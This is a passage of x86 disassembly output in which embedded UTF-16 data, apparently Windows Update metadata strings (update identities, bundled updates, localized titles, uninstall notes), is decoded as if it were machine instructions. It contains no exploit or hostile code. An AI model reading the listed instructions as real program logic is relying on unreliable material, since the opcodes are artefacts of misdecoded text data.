  408a3f:	00 61 00             	add    %ah,0x0(%ecx)
  408a42:	74 00                	je     0x408a44
  408a44:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  408a48:	6f                   	outsl  %ds:(%esi),(%dx)
  408a49:	00 72 00             	add    %dh,0x0(%edx)
  408a4c:	79 00                	jns    0x408a4e
  408a4e:	3d 00 22 00 74       	cmp    $0x74002200,%eax
  408a53:	00 72 00             	add    %dh,0x0(%edx)
  408a56:	75 00                	jne    0x408a58
  408a58:	65 00 22             	add    %ah,%gs:(%edx)
  408a5b:	00 26                	add    %ah,(%esi)
  408a5d:	00 67 00             	add    %ah,0x0(%edi)
  408a60:	74 00                	je     0x408a62
  408a62:	3b 00                	cmp    (%eax),%eax
  408a64:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408a69:	00 3b                	add    %bh,(%ebx)
  408a6b:	00 55 00             	add    %dl,0x0(%ebp)
  408a6e:	70 00                	jo     0x408a70
  408a70:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408a74:	74 00                	je     0x408a76
  408a76:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  408a7a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  408a7e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a7f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  408a83:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  408a87:	00 20                	add    %ah,(%eax)
  408a89:	00 55 00             	add    %dl,0x0(%ebp)
  408a8c:	70 00                	jo     0x408a8e
  408a8e:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408a92:	74 00                	je     0x408a94
  408a94:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  408a98:	44                   	inc    %esp
  408a99:	00 3d 00 22 00 30    	add    %bh,0x30002200
  408a9f:	00 66 00             	add    %ah,0x0(%esi)
  408aa2:	61                   	popa
  408aa3:	00 31                	add    %dh,(%ecx)
  408aa5:	00 32                	add    %dh,(%edx)
  408aa7:	00 30                	add    %dh,(%eax)
  408aa9:	00 31                	add    %dh,(%ecx)
  408aab:	00 64 00 2d          	add    %ah,0x2d(%eax,%eax,1)
  408aaf:	00 34 00             	add    %dh,(%eax,%eax,1)
  408ab2:	33 00                	xor    (%eax),%eax
  408ab4:	33 00                	xor    (%eax),%eax
  408ab6:	30 00                	xor    %al,(%eax)
  408ab8:	2d 00 34 00 66       	sub    $0x66003400,%eax
  408abd:	00 61 00             	add    %ah,0x0(%ecx)
  408ac0:	38 00                	cmp    %al,(%eax)
  408ac2:	2d 00 38 00 61       	sub    $0x61003800,%eax
  408ac7:	00 65 00             	add    %ah,0x0(%ebp)
  408aca:	39 00                	cmp    %eax,(%eax)
  408acc:	2d 00 62 00 38       	sub    $0x38006200,%eax
  408ad1:	00 37                	add    %dh,(%edi)
  408ad3:	00 37                	add    %dh,(%edi)
  408ad5:	00 34 00             	add    %dh,(%eax,%eax,1)
  408ad8:	37                   	aaa
  408ad9:	00 33                	add    %dh,(%ebx)
  408adb:	00 62 00             	add    %ah,0x0(%edx)
  408ade:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  408ae2:	34 00                	xor    $0x0,%al
  408ae4:	31 00                	xor    %eax,(%eax)
  408ae6:	22 00                	and    (%eax),%al
  408ae8:	20 00                	and    %al,(%eax)
  408aea:	2f                   	das
  408aeb:	00 26                	add    %ah,(%esi)
  408aed:	00 67 00             	add    %ah,0x0(%edi)
  408af0:	74 00                	je     0x408af2
  408af2:	3b 00                	cmp    (%eax),%eax
  408af4:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408af9:	00 3b                	add    %bh,(%ebx)
  408afb:	00 2f                	add    %ch,(%edi)
  408afd:	00 41 00             	add    %al,0x0(%ecx)
  408b00:	74 00                	je     0x408b02
  408b02:	4c                   	dec    %esp
  408b03:	00 65 00             	add    %ah,0x0(%ebp)
  408b06:	61                   	popa
  408b07:	00 73 00             	add    %dh,0x0(%ebx)
  408b0a:	74 00                	je     0x408b0c
  408b0c:	4f                   	dec    %edi
  408b0d:	00 6e 00             	add    %ch,0x0(%esi)
  408b10:	65 00 26             	add    %ah,%gs:(%esi)
  408b13:	00 67 00             	add    %ah,0x0(%edi)
  408b16:	74 00                	je     0x408b18
  408b18:	3b 00                	cmp    (%eax),%eax
  408b1a:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408b1f:	00 3b                	add    %bh,(%ebx)
  408b21:	00 2f                	add    %ch,(%edi)
  408b23:	00 50 00             	add    %dl,0x0(%eax)
  408b26:	72 00                	jb     0x408b28
  408b28:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408b2c:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  408b30:	75 00                	jne    0x408b32
  408b32:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  408b38:	74 00                	je     0x408b3a
  408b3a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408b3e:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408b42:	74 00                	je     0x408b44
  408b44:	3b 00                	cmp    (%eax),%eax
  408b46:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408b4b:	00 3b                	add    %bh,(%ebx)
  408b4d:	00 42 00             	add    %al,0x0(%edx)
  408b50:	75 00                	jne    0x408b52
  408b52:	6e                   	outsb  %ds:(%esi),(%dx)
  408b53:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  408b57:	00 65 00             	add    %ah,0x0(%ebp)
  408b5a:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  408b5e:	70 00                	jo     0x408b60
  408b60:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408b64:	74 00                	je     0x408b66
  408b66:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408b6a:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408b6e:	74 00                	je     0x408b70
  408b70:	3b 00                	cmp    (%eax),%eax
  408b72:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408b77:	00 3b                	add    %bh,(%ebx)
  408b79:	00 55 00             	add    %dl,0x0(%ebp)
  408b7c:	70 00                	jo     0x408b7e
  408b7e:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408b82:	74 00                	je     0x408b84
  408b84:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  408b88:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  408b8c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b8d:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  408b91:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  408b95:	00 20                	add    %ah,(%eax)
  408b97:	00 55 00             	add    %dl,0x0(%ebp)
  408b9a:	70 00                	jo     0x408b9c
  408b9c:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408ba0:	74 00                	je     0x408ba2
  408ba2:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  408ba6:	44                   	inc    %esp
  408ba7:	00 3d 00 22 00 01    	add    %bh,0x1002200
  408bad:	80 9f 22 00 20 00 52 	sbbb   $0x52,0x200022(%edi)
  408bb4:	00 65 00             	add    %ah,0x0(%ebp)
  408bb7:	76 00                	jbe    0x408bb9
  408bb9:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  408bbf:	6f                   	outsl  %ds:(%esi),(%dx)
  408bc0:	00 6e 00             	add    %ch,0x0(%esi)
  408bc3:	4e                   	dec    %esi
  408bc4:	00 75 00             	add    %dh,0x0(%ebp)
  408bc7:	6d                   	insl   (%dx),%es:(%edi)
  408bc8:	00 62 00             	add    %ah,0x0(%edx)
  408bcb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408bcf:	3d 00 22 00 32       	cmp    $0x32002200,%eax
  408bd4:	00 30                	add    %dh,(%eax)
  408bd6:	00 32                	add    %dh,(%edx)
  408bd8:	00 22                	add    %ah,(%edx)
  408bda:	00 20                	add    %ah,(%eax)
  408bdc:	00 2f                	add    %ch,(%edi)
  408bde:	00 26                	add    %ah,(%esi)
  408be0:	00 67 00             	add    %ah,0x0(%edi)
  408be3:	74 00                	je     0x408be5
  408be5:	3b 00                	cmp    (%eax),%eax
  408be7:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408bec:	00 3b                	add    %bh,(%ebx)
  408bee:	00 2f                	add    %ch,(%edi)
  408bf0:	00 42 00             	add    %al,0x0(%edx)
  408bf3:	75 00                	jne    0x408bf5
  408bf5:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf6:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  408bfa:	00 65 00             	add    %ah,0x0(%ebp)
  408bfd:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  408c01:	70 00                	jo     0x408c03
  408c03:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408c07:	74 00                	je     0x408c09
  408c09:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408c0d:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408c11:	74 00                	je     0x408c13
  408c13:	3b 00                	cmp    (%eax),%eax
  408c15:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408c1a:	00 3b                	add    %bh,(%ebx)
  408c1c:	00 2f                	add    %ch,(%edi)
  408c1e:	00 52 00             	add    %dl,0x0(%edx)
  408c21:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  408c26:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  408c2a:	00 6f 00             	add    %ch,0x0(%edi)
  408c2d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c2e:	00 73 00             	add    %dh,0x0(%ebx)
  408c31:	68 00 69 00 70       	push   $0x70006900
  408c36:	00 73 00             	add    %dh,0x0(%ebx)
  408c39:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408c3d:	74 00                	je     0x408c3f
  408c3f:	3b 00                	cmp    (%eax),%eax
  408c41:	27                   	daa
  408c42:	00 2c 00             	add    %ch,(%eax,%eax,1)
  408c45:	4e                   	dec    %esi
  408c46:	00 55 00             	add    %dl,0x0(%ebp)
  408c49:	4c                   	dec    %esp
  408c4a:	00 4c 00 01          	add    %cl,0x1(%eax,%eax,1)
  408c4e:	80 ab 27 00 2c 00 32 	subb   $0x32,0x2c0027(%ebx)
  408c55:	00 30                	add    %dh,(%eax)
  408c57:	00 34 00             	add    %dh,(%eax,%eax,1)
  408c5a:	2c 00                	sub    $0x0,%al
  408c5c:	34 00                	xor    $0x0,%al
  408c5e:	2c 00                	sub    $0x0,%al
  408c60:	4e                   	dec    %esi
  408c61:	00 27                	add    %ah,(%edi)
  408c63:	00 26                	add    %ah,(%esi)
  408c65:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  408c69:	00 3b                	add    %bh,(%ebx)
  408c6b:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  408c6f:	00 63 00             	add    %ah,0x0(%ebx)
  408c72:	61                   	popa
  408c73:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  408c77:	00 7a 00             	add    %bh,0x0(%edx)
  408c7a:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  408c7f:	00 72 00             	add    %dh,0x0(%edx)
  408c82:	6f                   	outsl  %ds:(%esi),(%dx)
  408c83:	00 70 00             	add    %dh,0x0(%eax)
  408c86:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408c8a:	74 00                	je     0x408c8c
  408c8c:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  408c92:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408c96:	74 00                	je     0x408c98
  408c98:	3b 00                	cmp    (%eax),%eax
  408c9a:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408c9f:	00 3b                	add    %bh,(%ebx)
  408ca1:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  408ca5:	00 6e 00             	add    %ch,0x0(%esi)
  408ca8:	67 00 75 00          	add    %dh,0x0(%di)
  408cac:	61                   	popa
  408cad:	00 67 00             	add    %ah,0x0(%edi)
  408cb0:	65 00 26             	add    %ah,%gs:(%esi)
  408cb3:	00 67 00             	add    %ah,0x0(%edi)
  408cb6:	74 00                	je     0x408cb8
  408cb8:	3b 00                	cmp    (%eax),%eax
  408cba:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  408cbe:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408cc3:	00 3b                	add    %bh,(%ebx)
  408cc5:	00 2f                	add    %ch,(%edi)
  408cc7:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  408ccb:	00 6e 00             	add    %ch,0x0(%esi)
  408cce:	67 00 75 00          	add    %dh,0x0(%di)
  408cd2:	61                   	popa
  408cd3:	00 67 00             	add    %ah,0x0(%edi)
  408cd6:	65 00 26             	add    %ah,%gs:(%esi)
  408cd9:	00 67 00             	add    %ah,0x0(%edi)
  408cdc:	74 00                	je     0x408cde
  408cde:	3b 00                	cmp    (%eax),%eax
  408ce0:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408ce5:	00 3b                	add    %bh,(%ebx)
  408ce7:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  408ceb:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  408cef:	00 65 00             	add    %ah,0x0(%ebp)
  408cf2:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408cf6:	74 00                	je     0x408cf8
  408cf8:	3b 00                	cmp    (%eax),%eax
  408cfa:	01 43 26             	add    %eax,0x26(%ebx)
  408cfd:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  408d01:	00 3b                	add    %bh,(%ebx)
  408d03:	00 2f                	add    %ch,(%edi)
  408d05:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  408d09:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  408d0d:	00 65 00             	add    %ah,0x0(%ebp)
  408d10:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408d14:	74 00                	je     0x408d16
  408d16:	3b 00                	cmp    (%eax),%eax
  408d18:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408d1d:	00 3b                	add    %bh,(%ebx)
  408d1f:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  408d23:	00 73 00             	add    %dh,0x0(%ebx)
  408d26:	63 00                	arpl   %eax,(%eax)
  408d28:	72 00                	jb     0x408d2a
  408d2a:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  408d30:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408d36:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408d3a:	74 00                	je     0x408d3c
  408d3c:	3b 00                	cmp    (%eax),%eax
  408d3e:	00 81 8f 26 00 6c    	add    %al,0x6c00268f(%ecx)
  408d44:	00 74 00 3b          	add    %dh,0x3b(%eax,%eax,1)
  408d48:	00 2f                	add    %ch,(%edi)
  408d4a:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  408d4e:	00 73 00             	add    %dh,0x0(%ebx)
  408d51:	63 00                	arpl   %eax,(%eax)
  408d53:	72 00                	jb     0x408d55
  408d55:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  408d5b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408d61:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408d65:	74 00                	je     0x408d67
  408d67:	3b 00                	cmp    (%eax),%eax
  408d69:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408d6e:	00 3b                	add    %bh,(%ebx)
  408d70:	00 55 00             	add    %dl,0x0(%ebp)
  408d73:	6e                   	outsb  %ds:(%esi),(%dx)
  408d74:	00 69 00             	add    %ch,0x0(%ecx)
  408d77:	6e                   	outsb  %ds:(%esi),(%dx)
  408d78:	00 73 00             	add    %dh,0x0(%ebx)
  408d7b:	74 00                	je     0x408d7d
  408d7d:	61                   	popa
  408d7e:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408d82:	00 4e 00             	add    %cl,0x0(%esi)
  408d85:	6f                   	outsl  %ds:(%esi),(%dx)
  408d86:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408d8a:	00 73 00             	add    %dh,0x0(%ebx)
  408d8d:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408d91:	74 00                	je     0x408d93
  408d93:	3b 00                	cmp    (%eax),%eax
  408d95:	54                   	push   %esp
  408d96:	00 68 00             	add    %ch,0x0(%eax)
  408d99:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  408d9f:	73 00                	jae    0x408da1
  408da1:	6f                   	outsl  %ds:(%esi),(%dx)
  408da2:	00 66 00             	add    %ah,0x0(%esi)
  408da5:	74 00                	je     0x408da7
  408da7:	77 00                	ja     0x408da9
  408da9:	61                   	popa
  408daa:	00 72 00             	add    %dh,0x0(%edx)
  408dad:	65 00 20             	add    %ah,%gs:(%eax)
  408db0:	00 75 00             	add    %dh,0x0(%ebp)
  408db3:	70 00                	jo     0x408db5
  408db5:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408db9:	74 00                	je     0x408dbb
  408dbb:	65 00 20             	add    %ah,%gs:(%eax)
  408dbe:	00 63 00             	add    %ah,0x0(%ebx)
  408dc1:	61                   	popa
  408dc2:	00 6e 00             	add    %ch,0x0(%esi)
  408dc5:	20 00                	and    %al,(%eax)
  408dc7:	62 00                	bound  %eax,(%eax)
  408dc9:	65 00 20             	add    %ah,%gs:(%eax)
  408dcc:	00 72 00             	add    %dh,0x0(%edx)
  408dcf:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  408dd3:	6f                   	outsl  %ds:(%esi),(%dx)
  408dd4:	00 76 00             	add    %dh,0x0(%esi)
  408dd7:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  408ddc:	00 62 00             	add    %ah,0x0(%edx)
  408ddf:	79 00                	jns    0x408de1
  408de1:	20 00                	and    %al,(%eax)
  408de3:	73 00                	jae    0x408de5
  408de5:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  408dea:	00 63 00             	add    %ah,0x0(%ebx)
  408ded:	74 00                	je     0x408def
  408def:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  408df5:	20 00                	and    %al,(%eax)
  408df7:	56                   	push   %esi
  408df8:	00 69 00             	add    %ch,0x0(%ecx)
  408dfb:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  408dff:	20 00                	and    %al,(%eax)
  408e01:	69 00 6e 00 73 00    	imul   $0x73006e,(%eax),%eax
  408e07:	74 00                	je     0x408e09
  408e09:	61                   	popa
  408e0a:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408e0e:	00 65 00             	add    %ah,0x0(%ebp)
  408e11:	64 00 20             	add    %ah,%fs:(%eax)
  408e14:	00 75 00             	add    %dh,0x0(%ebp)
  408e17:	70 00                	jo     0x408e19
  408e19:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  408e1d:	74 00                	je     0x408e1f
  408e1f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408e23:	20 00                	and    %al,(%eax)
  408e25:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  408e2b:	74 00                	je     0x408e2d
  408e2d:	68 00 65 00 20       	push   $0x20006500
  408e32:	00 50 00             	add    %dl,0x0(%eax)
  408e35:	72 00                	jb     0x408e37
  408e37:	6f                   	outsl  %ds:(%esi),(%dx)
  408e38:	00 67 00             	add    %ah,0x0(%edi)
  408e3b:	72 00                	jb     0x408e3d
  408e3d:	61                   	popa
  408e3e:	00 6d 00             	add    %ch,0x0(%ebp)
  408e41:	73 00                	jae    0x408e43
  408e43:	20 00                	and    %al,(%eax)
  408e45:	61                   	popa
  408e46:	00 6e 00             	add    %ch,0x0(%esi)
  408e49:	64 00 20             	add    %ah,%fs:(%eax)
  408e4c:	00 46 00             	add    %al,0x0(%esi)
  408e4f:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  408e53:	74 00                	je     0x408e55
  408e55:	75 00                	jne    0x408e57
  408e57:	72 00                	jb     0x408e59
  408e59:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408e5d:	20 00                	and    %al,(%eax)
  408e5f:	43                   	inc    %ebx
  408e60:	00 6f 00             	add    %ch,0x0(%edi)
  408e63:	6e                   	outsb  %ds:(%esi),(%dx)
  408e64:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408e68:	00 6f 00             	add    %ch,0x0(%edi)
  408e6b:	6c                   	insb   (%dx),%es:(%edi)
  408e6c:	00 20                	add    %ah,(%eax)
  408e6e:	00 50 00             	add    %dl,0x0(%eax)
  408e71:	61                   	popa
  408e72:	00 6e 00             	add    %ch,0x0(%esi)
  408e75:	65 00 6c 00 2e       	add    %ch,%gs:0x2e(%eax,%eax,1)
  408e7a:	00 26                	add    %ah,(%esi)
  408e7c:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  408e80:	00 3b                	add    %bh,(%ebx)
  408e82:	00 2f                	add    %ch,(%edi)
  408e84:	00 55 00             	add    %dl,0x0(%ebp)
  408e87:	6e                   	outsb  %ds:(%esi),(%dx)
  408e88:	00 69 00             	add    %ch,0x0(%ecx)
  408e8b:	6e                   	outsb  %ds:(%esi),(%dx)
  408e8c:	00 73 00             	add    %dh,0x0(%ebx)
  408e8f:	74 00                	je     0x408e91
  408e91:	61                   	popa
  408e92:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  408e96:	00 4e 00             	add    %cl,0x0(%esi)
  408e99:	6f                   	outsl  %ds:(%esi),(%dx)
  408e9a:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408e9e:	00 73 00             	add    %dh,0x0(%ebx)
  408ea1:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408ea5:	74 00                	je     0x408ea7
  408ea7:	3b 00                	cmp    (%eax),%eax
  408ea9:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408eae:	00 3b                	add    %bh,(%ebx)
  408eb0:	00 4d 00             	add    %cl,0x0(%ebp)
  408eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  408eb4:	00 72 00             	add    %dh,0x0(%edx)
  408eb7:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  408ebb:	6e                   	outsb  %ds:(%esi),(%dx)
  408ebc:	00 66 00             	add    %ah,0x0(%esi)
  408ebf:	6f                   	outsl  %ds:(%esi),(%dx)
  408ec0:	00 55 00             	add    %dl,0x0(%ebp)
  408ec3:	72 00                	jb     0x408ec5
  408ec5:	6c                   	insb   (%dx),%es:(%edi)
  408ec6:	00 26                	add    %ah,(%esi)
  408ec8:	00 67 00             	add    %ah,0x0(%edi)
  408ecb:	74 00                	je     0x408ecd
  408ecd:	3b 00                	cmp    (%eax),%eax
  408ecf:	00 4d 26             	add    %cl,0x26(%ebp)
  408ed2:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  408ed6:	00 3b                	add    %bh,(%ebx)
  408ed8:	00 2f                	add    %ch,(%edi)
  408eda:	00 4d 00             	add    %cl,0x0(%ebp)
  408edd:	6f                   	outsl  %ds:(%esi),(%dx)
  408ede:	00 72 00             	add    %dh,0x0(%edx)
  408ee1:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  408ee5:	6e                   	outsb  %ds:(%esi),(%dx)
  408ee6:	00 66 00             	add    %ah,0x0(%esi)
  408ee9:	6f                   	outsl  %ds:(%esi),(%dx)
  408eea:	00 55 00             	add    %dl,0x0(%ebp)
  408eed:	72 00                	jb     0x408eef
  408eef:	6c                   	insb   (%dx),%es:(%edi)
  408ef0:	00 26                	add    %ah,(%esi)
  408ef2:	00 67 00             	add    %ah,0x0(%edi)
  408ef5:	74 00                	je     0x408ef7
  408ef7:	3b 00                	cmp    (%eax),%eax
  408ef9:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408efe:	00 3b                	add    %bh,(%ebx)
  408f00:	00 53 00             	add    %dl,0x0(%ebx)
  408f03:	75 00                	jne    0x408f05
  408f05:	70 00                	jo     0x408f07
  408f07:	70 00                	jo     0x408f09
  408f09:	6f                   	outsl  %ds:(%esi),(%dx)
  408f0a:	00 72 00             	add    %dh,0x0(%edx)
  408f0d:	74 00                	je     0x408f0f
  408f0f:	55                   	push   %ebp
  408f10:	00 72 00             	add    %dh,0x0(%edx)
  408f13:	6c                   	insb   (%dx),%es:(%edi)
  408f14:	00 26                	add    %ah,(%esi)
  408f16:	00 67 00             	add    %ah,0x0(%edi)
  408f19:	74 00                	je     0x408f1b
  408f1b:	3b 00                	cmp    (%eax),%eax
  408f1d:	00 79 26             	add    %bh,0x26(%ecx)
  408f20:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  408f24:	00 3b                	add    %bh,(%ebx)
  408f26:	00 2f                	add    %ch,(%edi)
  408f28:	00 53 00             	add    %dl,0x0(%ebx)
  408f2b:	75 00                	jne    0x408f2d
  408f2d:	70 00                	jo     0x408f2f
  408f2f:	70 00                	jo     0x408f31
  408f31:	6f                   	outsl  %ds:(%esi),(%dx)
  408f32:	00 72 00             	add    %dh,0x0(%edx)
  408f35:	74 00                	je     0x408f37
  408f37:	55                   	push   %ebp
  408f38:	00 72 00             	add    %dh,0x0(%edx)
  408f3b:	6c                   	insb   (%dx),%es:(%edi)
  408f3c:	00 26                	add    %ah,(%esi)
  408f3e:	00 67 00             	add    %ah,0x0(%edi)
  408f41:	74 00                	je     0x408f43
  408f43:	3b 00                	cmp    (%eax),%eax
  408f45:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  408f4a:	00 3b                	add    %bh,(%ebx)
  408f4c:	00 2f                	add    %ch,(%edi)
  408f4e:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  408f52:	00 63 00             	add    %ah,0x0(%ebx)
  408f55:	61                   	popa
  408f56:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  408f5a:	00 7a 00             	add    %bh,0x0(%edx)
  408f5d:	65 00 64 00 50       	add    %ah,%gs:0x50(%eax,%eax,1)
  408f62:	00 72 00             	add    %dh,0x0(%edx)
  408f65:	6f                   	outsl  %ds:(%esi),(%dx)
  408f66:	00 70 00             	add    %dh,0x0(%eax)
  408f69:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408f6d:	74 00                	je     0x408f6f
  408f6f:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  408f75:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  408f79:	74 00                	je     0x408f7b
  408f7b:	3b 00                	cmp    (%eax),%eax
  408f7d:	27                   	daa
  408f7e:	00 2c 00             	add    %ch,(%eax,%eax,1)
  408f81:	20 00                	and    %al,(%eax)
  408f83:	4e                   	dec    %esi
  408f84:	00 55 00             	add    %dl,0x0(%ebp)
  408f87:	4c                   	dec    %esp
  408f88:	00 4c 00 2c          	add    %cl,0x2c(%eax,%eax,1)
  408f8c:	00 20                	add    %ah,(%eax)
  408f8e:	00 27                	add    %ah,(%edi)
  408f90:	00 65 00             	add    %ah,0x0(%ebp)
  408f93:	6e                   	outsb  %ds:(%esi),(%dx)
  408f94:	00 27                	add    %ah,(%edi)
  408f96:	00 01                	add    %al,(%ecx)
  408f98:	80 9d 27 00 2c 00 32 	sbbb   $0x32,0x2c0027(%ebp)
  408f9f:	00 30                	add    %dh,(%eax)
  408fa1:	00 34 00             	add    %dh,(%eax,%eax,1)
  408fa4:	2c 00                	sub    $0x0,%al
  408fa6:	32 00                	xor    (%eax),%al
  408fa8:	2c 00                	sub    $0x0,%al
  408faa:	4e                   	dec    %esi
  408fab:	00 27                	add    %ah,(%edi)
  408fad:	00 26                	add    %ah,(%esi)
  408faf:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  408fb3:	00 3b                	add    %bh,(%ebx)
  408fb5:	00 45 00             	add    %al,0x0(%ebp)
  408fb8:	78 00                	js     0x408fba
  408fba:	74 00                	je     0x408fbc
  408fbc:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  408fc0:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  408fc4:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  408fc8:	72 00                	jb     0x408fca
  408fca:	6f                   	outsl  %ds:(%esi),(%dx)
  408fcb:	00 70 00             	add    %dh,0x0(%eax)
  408fce:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408fd2:	74 00                	je     0x408fd4
  408fd4:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  408fda:	20 00                	and    %al,(%eax)
  408fdc:	44                   	inc    %esp
  408fdd:	00 65 00             	add    %ah,0x0(%ebp)
  408fe0:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  408fe4:	75 00                	jne    0x408fe6
  408fe6:	6c                   	insb   (%dx),%es:(%edi)
  408fe7:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  408feb:	00 72 00             	add    %dh,0x0(%edx)
  408fee:	6f                   	outsl  %ds:(%esi),(%dx)
  408fef:	00 70 00             	add    %dh,0x0(%eax)
  408ff2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408ff6:	74 00                	je     0x408ff8
  408ff8:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  408ffe:	4c                   	dec    %esp
